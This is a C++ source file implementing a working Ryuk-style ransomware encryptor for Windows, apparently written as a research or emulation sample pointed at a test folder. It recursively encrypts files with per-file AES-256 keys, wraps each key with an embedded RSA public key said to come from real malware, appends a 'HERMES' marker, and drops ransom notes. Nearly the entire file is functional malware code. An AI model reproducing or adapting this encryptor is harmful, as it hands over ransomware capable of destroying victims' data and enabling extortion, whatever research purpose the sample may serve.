//Author: Shaddy43

#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <Wincrypt.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <comdef.h>
#include <future>

using namespace std;
#pragma comment(lib, "Crypt32.lib")

struct CryptoParameters {
    DWORD blockSize = NULL;
    HCRYPTKEY hKey = NULL;
    HCRYPTPROV hCryptProv = NULL;
    std::string publicKey = "";
};

std::future<void> worker;

wstring StringToWString(const std::string&);
string bstr_to_str(BSTR);
void leaveNote(std::string);
bool checkExtension(std::string);
void handleError(const char*);
CryptoParameters InitiateCryptor();
void locker(const std::string&);
void lockFolder(const std::string&);
bool appendMeta(vector<BYTE>, CryptoParameters, std::string);

wstring StringToWString(const std::string& str)
{
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    wchar_t* buffer = new wchar_t[size];
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, buffer, size);
    wstring result(buffer);
    delete[] buffer;
    return result;
}

string bstr_to_str(BSTR source) {
    //source = L"lol2inside";
    _bstr_t wrapped_bstr = _bstr_t(source);
    int length = wrapped_bstr.length();
    char* char_array = new char[length];
    strcpy_s(char_array, length + 1, wrapped_bstr);
    return char_array;
}


void leaveNote(std::string sub_path)
{
    std::string ransomNote = "Sorry! Your files have been encrypted !!!";
    sub_path += "\\RyukReadMe.txt";
    const std::string fileName = sub_path;

    // Open or create the file using CreateFile
    HANDLE hFile = CreateFileA(
        fileName.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        //std::cerr << "Note file could not be created" << std::endl;
        return;
    }

    // Write the content to the file
    DWORD bytesWritten;
    if (!WriteFile(hFile, ransomNote.c_str(), static_cast<DWORD>(ransomNote.size()), &bytesWritten, nullptr)) {
        //std::cerr << "Note file could not be created" << std::endl;
    }

    // Close the file handle
    CloseHandle(hFile);
}

bool checkExtension(std::string fileName)
{
    // Define the list of extensions to skip
    string skipExtensions[] = { ".dll", ".lnk", ".hrmlog", ".ini", ".exe" };

    // Extract the file extension
    string extension = fileName.substr(fileName.find_last_of("."));

    // Compare the extension with the extensions for skipping
    for (int i = 0; i < skipExtensions->size(); i++) {
        if (extension == skipExtensions[i]) {
            //std::cout << "Skipping file with extension: " << skipExtensions[i] << std::endl;
            return false;
        }
    }
    return true;
}

void handleError(const char* message)
{
    cerr << message << " error code: " << GetLastError() << endl;
    exit(-1);
}

CryptoParameters InitiateCryptor()
{
    // WARNING: Use your own public key here !!!
    // This is an actual attacker's public key found in malware, and i don't have its private key pair !!!
    CryptoParameters cparams;
    cparams.publicKey = "BgIAAACkAABSU0ExAAgAAAEAAQCV9LvY1+a2rVQQKmHIYxXwltivcgEVoGHGSlKiHlpscysu4TFFZjGnMZGNZWTRb7nMG3dbHsF+AtpEqANZtrFEa7qB93oCcKf2tekVmX8LvN3iaucvPjMyGmt9pVa/t7B4lrASmVHYi0srzzdQ8TkIc26mzHrr++ZWx3RMQbz+6Elsifb2Z1fwTdpnQUJ4Otq5pxlzifT2tsB8jMTJv59N7owqCYivCq9bToZrfUdmnX+2shzyaAe6axPaVArV/j2/iRk83i2piMda86GD87AryP5fTYApA2cCP2hicRWHNCFBJW5hne5doonZ9y2gn509GMxYv9qAhB2x8a9i8p6X";

    // Acquire a cryptographic context
    if (!CryptAcquireContext(&cparams.hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "Failed to acquire cryptographic context" << std::endl;
        return cparams;
    }

    // Generate an encryption key
    if (!CryptGenKey(cparams.hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &cparams.hKey)) {
        CryptReleaseContext(cparams.hCryptProv, 0);
        handleError("Failed to generate key");
        return cparams;
    }

    // Get the block size for the algorithm
    DWORD dwDataLen = sizeof(DWORD);
    if (!CryptGetKeyParam(cparams.hKey, KP_BLOCKLEN, (BYTE*)&cparams.blockSize, &dwDataLen, 0)) {
        CryptDestroyKey(cparams.hKey);
        CryptReleaseContext(cparams.hCryptProv, 0);
        handleError("Failed to get block size");
    }
    return cparams;
}

void locker(const std::string& inputFile)
{
    // A new key is generated for every file encryption
    CryptoParameters cparams = InitiateCryptor();

    // Handle errors in cparams initialization
    if (!cparams.hCryptProv || !cparams.hKey) {
        return;
    }

    // Open the input file
    ifstream fin(inputFile, ios::binary | ios::ate);
    if (!fin.is_open()) {
        return;
    }

    streampos size = fin.tellg();
    vector<char> data(size);
    fin.seekg(0, ios::beg);
    fin.read(data.data(), size);
    fin.close();

    // check if HERMES is available
    // Byte sequence to check: "HERMES"
    std::vector<BYTE> targetBytes = { 0x48, 0x45, 0x52, 0x4D, 0x45, 0x53 };

    // Check if data contains the target byte sequence
    if (std::search(data.begin(), data.end(), targetBytes.begin(), targetBytes.end()) != data.end()) {
        //std::cout << "File Encrypted Already. Skipping !!!" << std::endl;
        return;
    }
    else {

        // Encrypt the data
        DWORD bufferSize = static_cast<DWORD>(size) + cparams.blockSize;
        vector<BYTE> encryptedData(bufferSize);
        memcpy(encryptedData.data(), data.data(), size);

        DWORD dwSize = static_cast<DWORD>(size);
        if (!CryptEncrypt(cparams.hKey, NULL, TRUE, 0, encryptedData.data(), &dwSize, bufferSize)) {
            //std::cout << "Encryption Failed !!!" << std::endl;
            return;
        }
        
        // Append File Meta
        // Ryuk Ransomware appends encrypted session key at the end of every file because for every file a different key is used for encryption.
        if (appendMeta(encryptedData, cparams, inputFile))
        {
            std::cout << "Encrypted: " << inputFile << std::endl;
        }
    }
}

bool appendMeta(vector<BYTE> encryptedData, CryptoParameters cparams, std::string inputFile)
{
    std::vector<BYTE> publicKeyBytes;
    DWORD publicKeySize = 0;
    if (!CryptStringToBinaryA(cparams.publicKey.c_str(), 0, CRYPT_STRING_BASE64, NULL, &publicKeySize, NULL, NULL)) {
        CryptReleaseContext(cparams.hCryptProv, 0);
        //handleError("Error appending meta");
    }
    publicKeyBytes.resize(publicKeySize);
    if (!CryptStringToBinaryA(cparams.publicKey.c_str(), 0, CRYPT_STRING_BASE64, publicKeyBytes.data(), &publicKeySize, NULL, NULL)) {
        CryptReleaseContext(cparams.hCryptProv, 0);
        //handleError("Error appending meta");
    }

    HCRYPTKEY phKey = NULL;
    if (!CryptImportKey(cparams.hCryptProv, publicKeyBytes.data(), publicKeySize, 0, 0, &phKey)) {
        CryptDestroyKey(phKey);
        CryptDestroyKey(cparams.hKey);
        CryptReleaseContext(cparams.hCryptProv, 0);
        //handleError("Error importing key");
    }

    //Export AES key for encryption
    //Determine the size of the buffer needed for the exported key
    DWORD dwBufSizeAES = 0;
    if (!CryptExportKey(cparams.hKey, NULL, PLAINTEXTKEYBLOB, NULL, NULL, &dwBufSizeAES))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(cparams.hKey);
        CryptReleaseContext(cparams.hCryptProv, 0);
        //handleError("Error determining key buffer size");
        return false;
    }

    // Allocate a buffer for the exported key
    std::vector<BYTE> pbAesKey(dwBufSizeAES, 0);

    // Export the key to the buffer
    if (!CryptExportKey(cparams.hKey, NULL, PLAINTEXTKEYBLOB, NULL, pbAesKey.data(), &dwBufSizeAES))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(cparams.hKey);
        CryptReleaseContext(cparams.hCryptProv, 0);
        //handleError("Error exporting key");
        return false;
    }

    //Encrypt AES key with RSA public key
    //Determine the size of the buffer needed for the encrypted key
    DWORD dwBufSize = 0;
    if (!CryptEncrypt(phKey, NULL, TRUE, 0, NULL, &dwBufSize, 0))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(cparams.hKey);
        CryptReleaseContext(cparams.hCryptProv, 0);
        //handleError("Error determining encrypted buffer size");
        return false;
    }
    
    //PBYTE pbEncryptedKey = (PBYTE)malloc(dwBufSize);
    std::vector<BYTE> pbEncryptedKey(dwBufSize, 0);

    // Encrypt the AES key with RSA-OAEP padding
    memcpy(pbEncryptedKey.data(), pbAesKey.data(), dwBufSize);
    if (!CryptEncrypt(phKey, NULL, TRUE, 0, pbEncryptedKey.data(), &dwBufSizeAES, dwBufSize))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(cparams.hKey);
        CryptReleaseContext(cparams.hCryptProv, 0);
        //handleError("Error encrypting AES key");
        return false;
    }

    // RYUK ransomware identifies its encrypted files with keyword HERMES appended at the end of each encrypted file. After the keyword HERMES, the meta of file is appended which is basically an encrypted AES session key with Attacker's public key... !!!
    // String to prepend: "HERMES"
    std::string prependString = "SEMREH";

    // Convert ASCII string to bytes and prepend to pbEncryptedKey
    for (char ch : prependString) {
        pbEncryptedKey.insert(pbEncryptedKey.begin(), static_cast<BYTE>(ch));
    }

    // Append pbEncryptedKey to encryptedData
    encryptedData.insert(encryptedData.end(), pbEncryptedKey.begin(), pbEncryptedKey.end());

    // Write the encrypted data to the output file
    ofstream fout(inputFile, ios::binary);
    if (!fout.is_open()) {
        return false;
    }

    DWORD dwSize = static_cast<DWORD>(encryptedData.size());
    if (!fout.write(reinterpret_cast<char*>(encryptedData.data()), dwSize))
    {        
        return false;
    }

    fout.close();
    return true;
}


void lockFolder(const std::string& path)
{
    std::string search_path = path + "\\*.*";
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(StringToWString(search_path).c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(_bstr_t(fd.cFileName), ".") != 0 && strcmp(_bstr_t(fd.cFileName), "..") != 0) {
                // Recursively iterate subdirectory

                wstring ws(fd.cFileName);
                std::string str(ws.begin(), ws.end());

                std::string sub_path = path + "\\" + str;
                lockFolder(sub_path);

                //workers.emplace_back(lockFolder, sub_path, hKey, blockSize);
                leaveNote(sub_path);
            }
        }
        else {
            // File found, print path
            std::string fileName = bstr_to_str(_bstr_t(fd.cFileName));
            std::string str = path + "\\" + fileName;
            //std::cout << "path passed: " << str << std::endl;

            if (checkExtension(fileName))
            {
                //locker(str);

                //starting every file encryption routine in a separate thread
                worker = std::async(std::launch::async, locker, str);
            }
            else
            {
                continue;
            }
            
        }
    } while (FindNextFile(hFind, &fd) != 0);
     FindClose(hFind);
}

int main()
{
    std::string targetPath = "C:\\Users\\Public\\RyukTesting"; //Dont add brackets at the end of path
    std::cout << "[x] Setting target path for encryptor...!!!" << std::endl;
    std::cout << "Target path set: " << targetPath << std::endl;

    try 
    {
        //recusive encryptor started...!!!
        lockFolder(targetPath);
        worker.get();
    }
    catch (int e)
    {
        std::cerr << "Error Code: " << e << std::endl;
    }
    
    return 0;
}
